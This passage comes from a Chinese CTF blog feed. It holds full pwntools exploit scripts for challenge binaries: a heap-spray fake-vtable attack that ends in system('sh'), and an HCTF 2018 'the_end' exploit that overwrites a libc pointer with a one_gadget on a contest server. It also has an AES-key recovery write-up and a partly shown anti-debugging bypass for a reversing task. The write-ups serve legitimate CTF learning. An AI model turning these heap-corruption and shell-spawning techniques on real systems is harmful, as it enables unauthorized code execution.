class="comment"># In this program, HashMap operates in open addressing mode.</span></span><br><span class="line"><span class="comment"># It means, if same CRC32 hash exists in table, it looks for next entry.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># HashMap::get : it correctly does next_index = (cur_index + 1) % nbuckets;</span></span><br><span class="line"><span class="comment"># HashMap::set : next_index = cur_index + 1; &lt;-- omg</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># HashMap::set has OOB access for large hash, and Key-&gt;compare() is virtual.</span></span><br><span class="line"><span class="comment"># struct HashMap &#123; std::vector keys; Pair *buckets[4096]; &#125;</span></span><br><span class="line"><span class="comment"># struct Pair    &#123; const char *value; Key *key; &#125;</span></span><br><span class="line"><span class="comment"># So we can make a fake object with fake vftable to modify PC.</span></span><br><span class="line"><span class="comment"># To do this...</span></span><br><span class="line"><span class="comment">###############################################################################</span></span><br><span class="line"><span class="comment"># Step 1. Creating a fake hashmap entries</span></span><br><span class="line"><span class="comment"># HashMap-&gt;buckets[4096, 4097] = &lt;user controlled data&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-1. preparing a user-controllable area right after the hashmap</span></span><br><span class="line">r.sendline(<span class="string">&#x27;9&#x27;</span>*<span class="number">64</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-2. It fills last(4095th) entry in the hashmap.</span></span><br><span class="line">c = collision(<span class="number">0xffff</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">	<span class="built_in">print</span> `c.<span class="built_in">next</span>()`</span><br><span class="line">add(c.<span class="built_in">next</span>(), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-3. This is for rearranging recently-freed fastbins..</span></span><br><span class="line"><span class="comment">#      for achieving a user-controlled area right after the hashmap</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">	r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># At this point, the heap area will be:</span></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"><span class="comment"># | HashMap map ...  | 40byte freed fastbin | .. |</span></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"><span class="comment"># In my exploit, 4096th, 4097th will be</span></span><br><span class="line"><span class="comment"># 1) key: NULL, value: 0x29?</span></span><br><span class="line"><span class="comment"># 2) key: buf,  value: NULL</span></span><br><span class="line"><span class="comment"># I did heap spray for a fake objects.</span></span><br><span class="line">buf = <span class="number">0x2500008</span></span><br><span class="line">obj = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># - This is first pair. value will be uncontrollable chunk size object.</span></span><br><span class="line">obj += p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># - This is the second pair. It&#x27;s **STAGE 1** payload which overwrites:</span></span><br><span class="line"><span class="comment">#   ::map = new StringKey(obj)</span></span><br><span class="line">obj += p64(<span class="number">0</span>) + p64(buf)</span><br><span class="line"><span class="comment"># - For fitting the fastbin size (this area is freed as fastbin before)</span></span><br><span class="line">obj = obj.ljust(<span class="number">34</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"><span class="comment">#   and.. reversing CRC for convinient OOB.</span></span><br><span class="line">obj = collision(<span class="number">0xffff</span>,obj).<span class="built_in">next</span>()</span><br><span class="line"><span class="comment"># This locates two pair above, sets first pair to key: `obj`, value: &quot;shrimp&quot;</span></span><br><span class="line"><span class="comment"># Fills buckets[4096].</span></span><br><span class="line">add(obj, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Below is fake C++ objects &amp; fake hashmap bucket item pairs.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># These are three targets to write with a heap address (StringKey object)</span></span><br><span class="line">target1 = <span class="number">0x605880</span>     <span class="comment"># HashMap     map = heap</span></span><br><span class="line">target2 = <span class="number">0x6058a0</span>     <span class="comment"># std::string pow.ptr = heap</span></span><br><span class="line">target3 = <span class="number">0x6058b0</span> + <span class="number">1</span> <span class="comment"># std::string pow.capacity = heap &lt;&lt; 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload2 will be placed at [x &amp; ~0xfff for x in (heap_base + A, heap_base + B, 0x1000)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 1 object: ::map = new StringKey(obj)</span></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(buf + <span class="number">24</span>) + p64(target1) + p64(<span class="number">0</span>) + p64(<span class="number">0x40201c</span>)</span><br><span class="line">payload2 = payload2.ljust(<span class="number">48</span>)</span><br><span class="line"><span class="comment"># Stage 2 objects:</span></span><br><span class="line"><span class="comment"># 2-1. leak(arbitrary address)</span></span><br><span class="line">payload2 += p64(buf + <span class="number">48</span>) + p64(<span class="number">0x4014e0</span>)</span><br><span class="line"><span class="comment"># 2-2. ::pow.ptr = new StringKey(obj)</span></span><br><span class="line">payload2 += p64(buf + <span class="number">56</span> + <span class="number">24</span>) + p64(target2) + p64(<span class="number">0</span>) + p64(<span class="number">0x40201c</span>)</span><br><span class="line"><span class="comment"># 2-3. ::pow.capacity = new StringKey(obj) &lt;&lt; 8</span></span><br><span class="line">payload2 += p64(buf + <span class="number">88</span> + <span class="number">24</span>) + p64(target3) + p64(<span class="number">0</span>) + p64(<span class="number">0x40201c</span>)</span><br><span class="line"><span class="comment"># 2-4. *calls proof_of_work() for arbitrary write in ::map*</span></span><br><span class="line">payload2 += p64(buf + <span class="number">128</span>) + p64(<span class="number">0x401a49</span>)</span><br><span class="line"><span class="comment"># This null pointers are used for 1, 2-2, 2-3.</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x100</span>) + p64(<span class="number">0</span>) * <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Let me explain this shortly.</span></span><br><span class="line"><span class="comment"># 0x4014e0 is atoi. It&#x27;ll return 8 because &lt;rdi&gt; has p64(0x2500048).</span></span><br><span class="line"><span class="comment"># 0x40201c is HashMap::set. I used this to overwrite any pointer to a heap ptr.</span></span><br><span class="line"><span class="comment"># 0x401a49 is proof_of_work for arbitrary write in heap area.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 2. Calling a fake entry via HashMap::get</span></span><br><span class="line"><span class="comment"># Since ::map is now a dangling heap pointer, I can provide some fake entries.</span></span><br><span class="line"><span class="comment"># In this case, payload will be at buckets[10~].</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Below is fake hashmap bucket entries &amp; heap spray</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x605018</span>) + p64(buf + <span class="number">40</span>) + p64(<span class="number">0x605880</span>) + p64(buf + <span class="number">40</span>) + p64(<span class="number">0</span>) + p64(buf + <span class="number">56</span>) + p64(<span class="number">0</span>) + p64(buf + <span class="number">88</span>) + p64(<span class="number">0</span>) + p64(buf + <span class="number">120</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x1000</span> - <span class="number">0xe90</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is also used for heap spray.</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(payload) &lt; <span class="number">0xf000</span>:</span><br><span class="line">    payload += payload2.ljust(<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># It&#x27;s calculated to fill buf address.</span></span><br><span class="line">cnt = (<span class="number">1</span>&lt;&lt;<span class="number">26</span>)/<span class="number">0x10000</span></span><br><span class="line"><span class="built_in">print</span> cnt</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt):</span><br><span class="line">    sys.stdout.write(<span class="string">&#x27;Spraying heap - %4d (%02.2f%% done)\r\n&#x27;</span>%(i + <span class="number">1</span>, <span class="number">1.0</span>*i/cnt*<span class="number">100</span>))</span><br><span class="line">    <span class="comment">#sleep(0.5)</span></span><br><span class="line">    add(payload.ljust(<span class="number">0x10000</span>-<span class="number">1</span>-<span class="number">8</span>), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Triggers buckets[4097]-&gt;compare().</span></span><br><span class="line">add(c.<span class="built_in">next</span>(), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 2-1. Now ::map is modified, so we select some bucket and trigger it.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># map-&gt;buckets[10]-&gt;compare() --&gt; libc leak</span></span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(collision(<span class="number">10</span>).<span class="built_in">next</span>())</span><br><span class="line">r.recvuntil(<span class="string">&#x27;You ordered &#x27;</span>)</span><br><span class="line">setvbuf = u64(r.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6.so&#x27;</span>)</span><br><span class="line">libc.address = setvbuf - libc.symbols[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># map-&gt;buckets[11]-&gt;compare() --&gt; heap base leak</span></span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(collision(<span class="number">11</span>).<span class="built_in">next</span>())</span><br><span class="line">r.recvuntil(<span class="string">&#x27;You ordered &#x27;</span>)</span><br><span class="line">heap = u64(r.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># map-&gt;buckets[12]-&gt;compare() --&gt; ::pow.ptr = new StringKey()</span></span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(collision(<span class="number">12</span>).<span class="built_in">next</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># map-&gt;buckets[13]-&gt;compare() --&gt; ::pow.capacity = new StringKey() &lt;&lt; 8</span></span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(collision(<span class="number">13</span>).<span class="built_in">next</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># map-&gt;buckets[14]-&gt;compare() --&gt; proof_of_work()</span></span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(collision(<span class="number">14</span>).<span class="built_in">next</span>())</span><br><span class="line">r.recvuntil(<span class="string">&#x27;with \&#x27;&#x27;</span>)</span><br><span class="line">prefix = r.recvuntil(<span class="string">&quot;&#x27;&quot;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># proof_of_work() -&gt; map-&gt;buckets[15] = 0x??007368-8</span></span><br><span class="line"><span class="comment"># 0x??007368-8 --&gt; 0x??007368 (&quot;sh\x00?&quot;) --&gt; system(&quot;sh&quot;)</span></span><br><span class="line">addr = (heap + <span class="number">0xffffff</span>) &amp; ~<span class="number">0xffffff</span></span><br><span class="line">addr += u16(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">obj = prefix + <span class="string">&#x27;\x00&#x27;</span> * <span class="number">16</span> * <span class="number">13</span> + p64(<span class="number">0</span>) + p64(addr - <span class="number">8</span>) + <span class="string">&#x27;a&#x27;</span> * (addr - <span class="number">8</span> - heap - <span class="number">280</span>) + p64(addr) + p64(system)</span><br><span class="line">r.sendline(generate(obj))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Common-Crypto"><a href="#Common-Crypto" class="headerlink" title="Common Crypto"></a>Common Crypto</h3><p>标准的 AES 加密，先输入 flag ，然后把 flag AES 加密，最后和密文进行比较，通过分析加密函数，不难得出秘钥</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall <span class="title function_">sub_140001000</span><span class="params">(_BYTE *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// r11</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// er10</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// r14</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// di</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v8; <span class="comment">// si</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v9; <span class="comment">// bp</span></span><br><span class="line">  __int64 v10; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// bl</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  v1 = a1 + <span class="number">18</span>;</span><br><span class="line">  *a1 = byte_14001DA40;</span><br><span class="line">  v2 = <span class="number">4</span>;</span><br><span class="line">  a1[<span class="number">1</span>] = byte_14001DA41;</span><br><span class="line">  v3 = <span class="number">16</span>;</span><br><span class="line">  v4 = <span class="number">4</span>i64;</span><br><span class="line">  a1[<span class="number">2</span>] = byte_14001DA42;</span><br><span class="line">  a1[<span class="number">3</span>] = byte_14001DA43;</span><br><span class="line">  a1[<span class="number">4</span>] = byte_14001DA44;</span><br><span class="line">  a1[<span class="number">5</span>] = byte_14001DA45;</span><br><span class="line">  a1[<span class="number">6</span>] = byte_14001DA46;</span><br><span class="line">  a1[<span class="number">7</span>] = byte_14001DA47;</span><br><span class="line">  a1[<span class="number">8</span>] = byte_14001DA48;</span><br><span class="line">  a1[<span class="number">9</span>] = byte_14001DA49;</span><br><span class="line">  a1[<span class="number">10</span>] = byte_14001DA4A;</span><br><span class="line">  a1[<span class="number">11</span>] = byte_14001DA4B;</span><br><span class="line">  a1[<span class="number">12</span>] = byte_14001DA4C;</span><br><span class="line">  a1[<span class="number">13</span>] = byte_14001DA4D;</span><br><span class="line">  a1[<span class="number">14</span>] = byte_14001DA4E;</span><br><span class="line">  a1[<span class="number">15</span>] = byte_14001DA4F;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = v3 - <span class="number">4</span>;</span><br><span class="line">    v6 = a1[v5];</span><br><span class="line">    v7 = a1[(v5 + <span class="number">1</span>)];</span><br><span class="line">    v8 = a1[(v5 + <span class="number">2</span>)];</span><br><span class="line">    v9 = a1[(v5 + <span class="number">3</span>)];</span><br><span class="line">    <span class="keyword">if</span> ( !(v2 &amp; <span class="number">3</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = v6;</span><br><span class="line">      v11 = RijnDael_AES_LONG[v7];</span><br><span class="line">      v7 = RijnDael_AES_LONG[v8];</span><br><span class="line">      v12 = v9;</span><br><span class="line">      v9 = *(v10 + <span class="number">0x14001AC50</span>i64);</span><br><span class="line">      v8 = *(v12 + <span class="number">0x14001AC50</span>i64);</span><br><span class="line">      v6 = RijnDael_AES_LONG[(v4 &gt;&gt; <span class="number">2</span>) + <span class="number">512</span>] ^ v11;</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = v3 - <span class="number">16</span>;</span><br><span class="line">    ++v2;</span><br><span class="line">    ++v4;</span><br><span class="line">    *(v1 - <span class="number">2</span>) = v6 ^ a1[v13];</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">    *(v1 - <span class="number">1</span>) = v7 ^ a1[(v13 + <span class="number">1</span>)];</span><br><span class="line">    *v1 = v8 ^ a1[(v13 + <span class="number">2</span>)];</span><br><span class="line">    result = v9 ^ a1[(v13 + <span class="number">3</span>)];</span><br><span class="line">    v1[<span class="number">1</span>] = result;</span><br><span class="line">    v1 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 &lt; <span class="number">0xB0</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>秘钥就在 byte_14001DA40 开始的地址空间内，将他们提取出来，然后把密文解密(不知道是不是密钥不可见的原因，使用 python 脚本不能解密出明文，我使用了 PYG 密码工具可以正常解密)。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online16.png"
                      alt="image"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online17.png"
                      alt="image"
                ></p>
<p>为什么只有一半 flag？ AES 加密密文长度应该是 16 个字节，而给出的密文明显多于 16 个字节，仔细观察剩余的字符发现都在 ASCII 范围内，直接转换成字符即可得到 flag。</p>
<p>hxb2018{853ecfe52aeb60989e8d3351</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online18.png"
                      alt="image"
                ></p>
<p>最后缺了一个括号，补上就好了。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>HCTF 2018</title>
    <url>/2018/11/09/HCTF2018/</url>
    <content><![CDATA[<p>和师傅们打了一天半的 HCTF，题目质量很高，感谢杭电的师傅们带来的精彩比赛。</p>
<span id="more"></span>


<h2 id="the-end"><a href="#the-end" class="headerlink" title="the_end"></a>the_end</h2><p>这题大概一看感觉很简单，IDA的伪代码如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  void *buf; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  sleep(0);</span><br><span class="line">  printf(&quot;here is a gift %p, good luck ;)\n&quot;, &amp;sleep);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  close(1);</span><br><span class="line">  close(2);</span><br><span class="line">  for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    read(0, buf, 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  exit(1337);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>把 sleep 函数的地址给出，libc 的基地址也就知道了，紧接着就是 5 次的任意地址写，检查开启的保护发现除了 canary 全部开启，考虑一下 write-what-where，现在只有 where 不知道，而且程序在 read 之后就调用 exit 退出了，貌似没有留下任何的利用空间，那一个自然的思路就是能否利用 exit 函数呢？<br>赛中我考虑过这一点，但是在 google 上没有找到相关的利用姿势，赛后看了大佬的 wp 发现这道题和 0x00 ctf 2017 的 left 题目相似(为什么我比赛的时候找不到 ORZ)，而且这道题更简单一些。<br>这道题的基本思路就是从 exit 函数入手，由于只知道 libc 的地址，而且修改的时候目的地址必须是可写的，于是我们要寻找类似 call eax 这类动态调用的函数，它们极有可能是从 libc 的可写地址取出的函数。<br>我们可以通过调试来看，步入 exit 函数(每次都用 si 步入每个函数)：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/theend1.png"
                      alt="image"
                ><br>这里有一句 call edx，但是跟过去看一下内存：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/theend2.png"
                      alt="image"
                ><br>地址是乱掉的，而且观察到 mov 给 edx 之后还有对 edx 的解密操作，这是 libc 为了防止针对 _dl_fini 攻击而采取的措施，加密用到了一个 token，无法泄露。<br>于是继续跟进，在这里找到了另一处似乎可以利用的代码：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/theend3.png"
                      alt="image"
                ><br>call 了 libc 中数据段上的一个位置，这个位置是可写的，我们可以将这个地址覆盖为 one_gadget ，获取 shell。  </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug = 0</span><br><span class="line">if debug == 1:</span><br><span class="line">    p = process(&quot;./the_end&quot;)</span><br><span class="line">elif debug == 0:</span><br><span class="line">    token = &quot;KjMul8pLu4iagbDcJVMNCWaFdJ26Pc4y&quot;</span><br><span class="line">    p = remote(&quot;150.109.44.250&quot;, 20002)</span><br><span class="line">    p.recvuntil(&quot;Input your token:&quot;)</span><br><span class="line">    p.sendline(token)</span><br><span class="line">context(log_level=&quot;DEBUG&quot;)</span><br><span class="line">libc = ELF(&quot;./libc64.so&quot;)</span><br><span class="line">p.recvuntil(&quot;here is a gift &quot;)</span><br><span class="line">sleep_addr = int(p.recv(14),16)</span><br><span class="line">log.info(&quot;Sleep_addr = 0x%x&quot;, sleep_addr)</span><br><span class="line">libc_addr = sleep_addr - libc.symbols[&quot;sleep&quot;]</span><br><span class="line">log.success(&quot;libc addr : 0x%x&quot; % libc_addr)</span><br><span class="line">one_gadget = libc_addr + 0xf02a4</span><br><span class="line">log.info(&quot;one gadget = 0x%x&quot; % one_gadget)</span><br><span class="line">rtld_global = libc_addr + 0x5f0f48</span><br><span class="line">log.info(&quot;rtd_global = 0x%x&quot; % rtld_global)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&quot;;)\n&quot;)</span><br><span class="line">payload1 = p64(rtld_global)</span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(one_gadget)[0])</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line">payload2 = p64(rtld_global + 1)</span><br><span class="line">p.send(payload2)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(one_gadget)[1])</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line">payload3 = p64(rtld_global + 2)</span><br><span class="line">p.send(payload3)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(one_gadget)[2])</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line">payload4 = p64(rtld_global + 3)</span><br><span class="line">p.send(payload4)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(one_gadget)[3])</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line">payload5 = p64(rtld_global + 4)</span><br><span class="line">p.send(payload5)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(one_gadget)[4])</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;cat flag&gt;&amp;0&quot;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>趁着环境还没关，可以拿到 flag：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/theend4.png"
                      alt="image"
                ></p>
<p>注意最后发送命令的时候需要重定向输入，因为程序在一开始就 close(1) ，关闭了 stdout，但是不知道为什么，我在本地测试的时候就不能输出 flag，远程就可以了…<br>需要注意 one gadget 限制的很死，找到的四个只有这一个能用。</p>
<p>这个应该是预期解，但是看到师傅们还有一种做法是改了 vtable，有时间仔细研究一下。</p>
<h2 id="LuckyStar"><a href="#LuckyStar" class="headerlink" title="LuckyStar"></a>LuckyStar</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><p><strong>踩了很多坑，踩坑的过程就不写了。。。</strong></p>
<p>首先调用了 TLSCallBack 其中对一个函数(主函数)进行了解密，包括大概两种反调试手段.</p>
<p>之后会执行 start 函数，通常这是编译器自动插入的启动代码，但是在本题中，这个代码被出题人修改过，其中包含一些和flag运算相关的代码。<br>直接反编译 start 函数，发现伪代码中有许多函数没有有意义的名字，还夹杂着一些虚函数，单从静态代码看很难，所以推荐使用 OD 配合分析。<br>在 start 函数中会调用之前解密的函数对另一个函数解密，计算输入并且和加密的 flag 进行对比。</p>
<h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>OD 调试的时候要注意绕过反调试，否则不能正常进入 start 函数。<br>在 TLSCallBack 函数中存在两处反调试，第一个是遍历所有进程，检查是否存在 IDA OD 或者 x32DBG等工具，将程序中硬编码的字符串 patch 掉即可绕过。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/luckystar1.png"
                      alt="image"
                ><br>上图是我 patch 之后的效果，再次运行就能绕过这个反调试。</p>
<p>第二处采用系统调用 zwsetinformationthread，并设置函数参数为 </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, NULL, 0);</span><br></pre></td></tr></table></figure></div>
<p>将当前进程隐藏(注意第二个参数是 0x11)，调试器无法继续跟踪，通过修改此函数的参数即可绕过。<br>单步到对应的位置处(push 0x11)，我将 push 到栈上的 0x11 改成 -2，绕过这个反调试。</p>
<p>patch 掉反调试之后，可以发现解密第一个函数的算法：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/luckystar2.png"
                      alt="image"
                ><br>先 srand 设置随机数种子，然后对 0x401780 开始的 440 个字节进行解密，算法在伪代码中很清晰，我编写了一个 C 程序获取随机数：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    srand(0x61616161);</span><br><span class="line">    int token[1000];</span><br><span class="line">    int i;</span><br><span class="line">    for(i = 0; i &lt; 1000; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        token[i] = rand() % 0x2018;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i = 0; i &lt; 1000; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;0x%02x,&quot;,token[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>还有一个 IDA-Python 脚本将函数解密：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = 0x417000</span><br><span class="line">b = a + 8327168</span><br><span class="line">select = []</span><br><span class="line">while a &lt;=b :</span><br><span class="line">    select.append(Byte(a))</span><br><span class="line">    a += 1</span><br><span class="line">token = [*]    # 随机数太长，这里就不写出来了。。。</span><br><span class="line">v11 = 0x401780</span><br><span class="line">v12 = 440</span><br><span class="line">tt = 0</span><br><span class="line">while v12 &gt; 0:</span><br><span class="line">    v11 = v11 + 1</span><br><span class="line">    PatchByte(v11 - 1, Byte(v11 - 1) ^ select[token[tt]])</span><br><span class="line">    tt += 1</span><br><span class="line">    v12 -= 1</span><br></pre></td></tr></table></figure></div>
<p>经过清洗的函数可以正常反编译成伪代码(注意可能需要先对代码按 U 键全部取消解析，然后再 C 键转换成代码)：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_401780@&lt;eax&gt;(<span class="type">int</span> a1@&lt;ebp&gt;, <span class="type">int</span> a2@&lt;edi&gt;, <span class="type">int</span> a3@&lt;esi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// ST24_4</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp-CCh] [ebp-D8h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp-C8h] [ebp-D4h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp-C4h] [ebp-D0h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp-C0h] [ebp-CCh]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// 